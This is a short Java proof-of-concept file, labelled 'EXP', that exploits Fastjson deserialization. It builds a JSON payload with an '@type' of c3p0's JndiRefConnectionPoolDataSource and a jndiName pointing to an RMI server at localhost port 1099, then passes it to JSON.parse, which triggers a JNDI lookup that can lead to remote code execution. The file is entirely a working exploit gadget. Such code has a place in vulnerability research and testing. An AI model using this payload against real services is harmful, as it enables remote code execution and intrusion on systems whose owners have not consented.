package JNDIPoC;

import com.alibaba.fastjson.JSON;

public class JndiRefConnectionPoolDataSourceEXP {
    public static void main(String[] args) {
        System.out.println("[+] JndiRefConnectionPoolDataSource EXP");
        String payload = "{\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +
                "\"jndiName\":\"rmi://127.0.0.1:1099/wyt7dd\",\"LoginTimeout\":\"1\"}";
        JSON.parse(payload);
    }
}
